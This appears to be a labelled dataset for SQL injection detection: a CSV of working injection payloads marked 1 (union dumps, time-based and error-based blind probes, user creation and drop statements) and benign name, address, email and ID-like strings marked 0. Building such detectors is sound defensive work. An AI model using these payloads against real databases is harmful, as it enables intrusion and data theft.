index,payload,class
784," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1
785, (  sqlvuln  ) ,1
786, or 'text'   =   n'text',1
787, or '1'  =  '1'--,1
788,0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,1
789," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",1
790," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",1
791," select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",1
792," select * from users where id  =  1 or ""{{"" or 1  =  1 -- 1",1
793," select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",1
794," select * from users where id  =  1 or "",?"" or 1  =  1 -- 1",1
795,1 exec sp_   (  or exec xp_  ) ,1
796," select * from users where id  =  '1' or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
797,"""a"""" or 3  =  3--""",1
798,admin' --,1
799, (  select top 1,1
800,select * from users where id  =  1 +1 or 1  =  1 -- 1,1
801,having,1
802,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
803," select * from users where id  =  1 or ""\#"" or 1  =  1 -- 1",1
804, or '7659'  =  '7659,1
805," select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",1
806," select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",1
807,1 or 1  =  1,1
808,"""*""",1
809,replace,1
810," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",1
811," select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",1
812," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",1
813," select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",1
814,"""^""",1
815,*  (  |  (  objectclass  =  *   )    ) ,1
816," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
817,limit,1
818,or 1  =  1#,1
819," select * from users where id  =  1 or ""{%"" or 1  =  1 -- 1",1
820,*|,1
821," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
822,create user name identified by 'pass123',1
823," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",1
824," select * from users where id  =  1 or 1#""{ union select 'a',version  (    )   -- 1",1
825,.s,1
826," select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1",1
827,|,1
828,select * from users where id  =  1 <@1$ or 1  =  1 -- 1,1
829,x' OR full_name LIKE '%Bob%,1
830,#NAME?,1
831," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",1
832," select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",1
833," select * from users where id  =  1 union select !<@,version  (    )   -- 1",1
834," or benchmark  (  10000000,MD5  (  1   )    )   #",1
835, or sleep  (  __TIME__  )    =  ',1
836,# from wapiti,1
837,""" or sleep  (  __TIME__  )    =  """,1
838,sleep  (  __TIME__  )  #,1
839,  )   or pg_sleep  (  __TIME__  )  --,1
840,   )    )    or sleep  (  __TIME__  )    =  ',1
841, or sleep  (  __TIME__  )  #,1
842, or pg_sleep  (  __TIME__  )  --,1
843,   )    )    or pg_sleep  (  __TIME__  )  --,1
844,  )   or sleep  (  __TIME__  )    =  ',1
845,"1'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
846,"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
847,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",1
848,"1%'   )    )    union all select null,null,null,null,null#",1
849,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",1
850,1  )   as boed where 6787  =  6787,1
851,"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
852,"1"" where 4281  =  4281",1
853,"1%""  )   and 8024  =  3560--",1
854,"1""  )   and   (  5452  =  6050  )  *6050 and   (  ""ciyc"" like ""ciyc",1
855,"1""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
856,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",1
857,"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1
858,"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",1
859,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
860,-9534%' or 3038  =  3038,1
861,"1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
862,select   (  case when   (  7978  =  6009  )   then 7978 else 1/  (  select 0  )   end  )  --,1
863,"-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '",1
864,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
865,"-3794'  )   union all select 2485,2485,2485,2485,2485--",1
866,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",1
867,"1' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
868,"-6400   )    )    union all select 4650,4650,4650--",1
869,"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",1
870,"1""  )   as ztkr where 1532  =  1532",1
871,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",1
872,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'fbsi' like 'fbsi",1
873,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'uwep'  =  'uwep",1
874,"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xyhi""  =  ""xyhi",1
875,"1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",1
876,"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
877,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""pawh""  =  ""pawh",1
878, (  1589  =  1589  )  *1,1
879,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",1
880,1   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9548  =  9548,1
881,1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,1
882,-5021'+  (  select yadq where 4285  =  4285 order by 1#,1
883,1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1
884,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",1
885,"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""jozh""  =  ""jozh",1
886,"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",1
887,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
888,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",1
889,1'  )   as rbpx where 1264  =  1264,1
890,"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1
891,if  (  8284  =  6171  )   select 8284 else drop function mbih--,1
892,1   )    )    or sleep  (  5  )  #,1
893,"-7868""   )    )    or 9323  =  9323#",1
894,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",1
895,"1"" where 2462  =  2462 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
896,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'mfib'  =  'mfib",1
897,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
898,1%' and 4595  =  4595#,1
899,1'  )   as oknw where 8777  =  8777,1
900,"1"" where 6501  =  6501",1
901,"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929",1
902,-7999  )   or 8422  =  1336,1
903,-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
904,"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
905,"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",1
906,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",1
907,select case when 6558  =  4327 then 1 else null end--,1
908,-7535  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
909," end and    (    (   ""rqay"" like ""rqay",1
910,"-2312'   )    )     )   union all select 5282,5282,5282,5282,5282,5282,5282,5282--",1
911,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
912,select   (  case when   (  8993  =  8846  )   then 8993 else 8993*  (  select 8993 from mysql.db  )   end  )  #,1
913,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  '%'  =  '",1
914,"select pg_sleep  (  5  )   and   (  ""%""  =  """,1
915,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   4142  =  4142",1
916,"-8153'  )   as qhlb where 4948  =  4948 union all select 4948,4948,4948,4948,4948,4948#",1
917,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
918,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
919,"1%""  )   and 2006  =  2006",1
920,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",1
921,"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc",1
922,"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
923,"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- loao",1
924,-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,1
925,"iif  (  7889  =  5114,1,1/0  )  ",1
926,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",1
927,"1""   )    )    union all select null,null,null,null,null,null,null,null#",1
928,"1%'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
929,"1%'  )   and elt  (  4249  =  4249,7259  )   and   (  '%'  =  '",1
930,1'  )   where 4867  =  4867 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
931,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,1
932,"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",1
933,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
934,-3859  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  5846  =  5846,1
935," end and   (  ""qkkn"" like ""qkkn",1
936,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
937,-2120'  )   or 8734  =  8844#,1
938,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",1
939,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
940,"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",1
941,1  )   and 4595  =  4595#,1
942,"-4984%""   )    )     )   union all select 6980,6980,6980,6980,6980,6980,6980,6980#",1
943,"-5224'  )   where 1962  =  1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",1
944,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
945,"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1
946,"1""   )    )     )   union all select null,null,null,null,null--",1
947,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",1
948,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",1
949,"-3721'  )   union all select 9050,9050--",1
950,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
951,"1""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
952,1%'  )   order by 1--,1
953,"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",1
954,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
955," end and   (  ""vwbx""  =  ""vwbx",1
956,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
957,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,1
958,"-9087"" order by 1#",1
959,-7562  )   or 8571  =  8571--,1
960,"-3707""   )    )     )   or 8571  =  8571--",1
961,1'+  (  select twyt where 3376  =  3376 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',1
962,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",1
963,1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
964,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1
965,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,1
966,"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
967,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
968,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
969,select   (  case when   (  1275  =  7674  )   then 1275 else 1275*  (  select 1275 from information_schema.character_sets  )   end  )  #,1
970,"1""  )   as duvm where 6190  =  6190 order by 1--",1
971,-8665' or 6825  =  7840 and 'vbsy' like 'vbsy,1
972,"1%' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '%'  =  '",1
973,"1'||  (  select 'bnaz' from dual where 7168  =  7168 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
974,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
975,"-7686%""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
976,1'  )   and   (  7603  =  3634  )  *3634,1
977,"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
978,"1%""   )    )    and 7533  =  7533 and    (    (   ""%""  =  """,1
979,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,1
980,"-7371'  )   union all select 4531,4531,4531#",1
981,select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,1
982,"1   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8814  =  8814",1
983,select case when 1574  =  5523 then 1 else null end--,1
984,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1
985,"-4785""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
986,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nimx'  =  'nimx",1
987,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
988,select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,1
989,"-9854  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  5696  =  5696",1
990,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
991,"1' union all select null,null,null,null--",1
992,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",1
993,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",1
994,"1""   )    )    as uaxn where 5657  =  5657 rlike   (  select   (  case when   (  3548  =  7206  )   then 1 else 0x28 end   )    )   --",1
995,"-4670""   )    )    or 3038  =  3038",1
996,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1
997,"1' in boolean mode  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1
998,1'  )   where 2753  =  2753 and   (  2739  =  8047  )  *8047--,1
999,1'+  (  select 'ljtl' where 1766  =  1766,1
12503,seto,0
12504,to85lo372,0
12505,vidrioso,0
12506,6180,0
12507,36914497a,0
12508,ajona valenzuela,0
12509,armenteros,0
12510,aylmar6,0
12511,claudio iturrieta,0
12512,j0ctar,0
12513,5.45E+15,0
12514,6.61E+15,0
12515,newtell@theroxyblue.ir,0
12516,braham,0
12517,8547,0
12518,portal,0
12519,dellinge,0
12520,persaud,0
12521,maiga,0
12522,kawahara,0
12523,winde,0
12524,"luis de gongora, 189",0
12525,4.95E+15,0
12526,59973244p,0
12527,benigni@viajesdacapalla.pa,0
12528,eggebraa,0
12529,"calle miguel lopez de legazpi, 48, 8f",0
12530,o.toole,0
12531,8.05E+15,0
12532,lacey@bwds.mp,0
12533,gering,0
12534,chilches/xilxes,0
12535,"c/ poeta bernardo de la torre 10,",0
12536,milly7,0
12537,marketa,0
12538,8537,0
12539,gilda6@mytanga.om,0
12540,belalczar,0
12541,bazo san salvador,0
12542,2161o1o,0
12543,delit@icods.ro,0
12544,gaile,0
12545,olivio,0
12546,6$ng4tado,0
12547,bollullos de la mitacin,0
12548,kovacs,0
12549,toba,0
12550,2.78E+15,0
12551,kiam,0
12552,45518730m,0
12553,harvison,0
12554,gaylor,0
12555,me93a,0
12556,el-hawar,0
12557,2.53E+15,0
12558,masegosa,0
12559,herminia,0
12560,kiri,0
12561,boggs@cocteleria.dz,0
12562,forfoleda,0
12563,cerpa oitavn,0
12564,moloney@imarbella.travel,0
12565,arajol lo cascio,0
12566,3.99E+14,0
12567,adahuesca,0
12568,planthar,0
12569,walborn@19horas.cat,0
12570,3245,0
12571,kingslan,0
12572,roccardi.betten@carrillo-de-albornoz.mil,0
12573,rigente,0
12574,cambiazo,0
12575,02906029w,0
12576,otilio,0
12577,"carrera 55,",0
12578,hennon,0
12579,25793872q,0
12580,hau,0
12581,halbert,0
12582,satoh,0
12583,matthiew,0
12584,aristofnico,0
12585,22268,0
12586,ozselcuk,0
12587,14970,0
12588,yasna,0
12589,chi-keun,0
12590,9ig7a2i4,0
12591,19197,0
12592,928,0
12593,stimson_holbrook@cementosanfranq.ly,0
12594,cangrenarse,0
12595,9.18E+15,0
12596,solonitsin3@neotelecom.fi,0
12597,s3borrea,0
12598,paseo arco del ladrillo 48 10?h,0
12599,93310194e,0
12600,glyn7,0
12601,nufrago,0
12602,4or6un0,0
12603,4881,0
12604,cos6rio,0
12605,venfica,0
12606,rist,0
12607,carmelo,0
12608,4.86E+14,0
12609,beal,0
12610,imokoude@transportesvegasl.et,0
12611,63171354z,0
12612,9usta4ui6,0
12613,august,0
12614,necforo,0
12615,tomkin,0
12616,calle tras do colexio s/n,0
12617,gambs galatioto,0
12618,kulle@coworkers.tl,0
12619,steele-kripilani@vendomiatico.se,0
12620,mae,0
12621,583opi4,0
12622,78,0
12623,michalopoulos8@aprendeaestudiar.vn,0
12624,eldredge,0
12625,hao,0
12626,saprtich@seramitex.sv,0
12627,leonella,0
12628,renan1@fichajes.nom.sd,0
12629,vilar elsegui,0
12630,lafferty,0
12631,truswell@soybueno.be,0
12632,rudolf,0
12633,de78e24423n6e,0
12634,08109487d,0
12635,38036492n,0
12636,cirio,0
12637,kappa,0
12638,morcn,0
12639,abietceo,0
12640,prats de lluans,0
12641,6411,0
12642,sineiro herranz,0
12643,al769i4,0
12644,"calle arriola 29,",0
12645,pa24dan3cea,0
12646,delujan,0
12647,backer@showcars.com.co,0
12648,eliseo,0
12649,jaspe ochoa,0
12650,13082383y,0
12651,8151,0
12652,kaz,0
12653,alconchel,0
12654,46343482t,0
12655,urea bernat,0
12656,pladeval berganciano,0
12657,albuminmetro,0
12658,1.52E+15,0
12659,werling,0
12660,48c09a,0
12661,mauer,0
12662,viena@redesmilitantes.pg,0
12663,bolvir,0
12664,rosalia,0
12665,persson_mcclanahan@deseoun.km,0
12666,61877469v,0
12667,6208,0
12668,coe,0
12669,ananas,0
12670,brihuega,0
12671,s16nio5o,0
12672,winstanley@waterflyesp.hn,0
12673,philip7,0
12674,salvi figuls,0
12675,09899393d,0
12676,wilbur,0
12677,19140,0
12678,19185,0
12679,"c/ cardenal cisneros 70, 12?d",0
12680,4.42E+15,0
12681,giertych,0
12682,34309,0
12683,37748,0
12684,navas de jorquera,0
12685,lab2a8o4i0,0
12686,r3i8a83nt1,0
12687,loktev@theroxyblue.aero,0
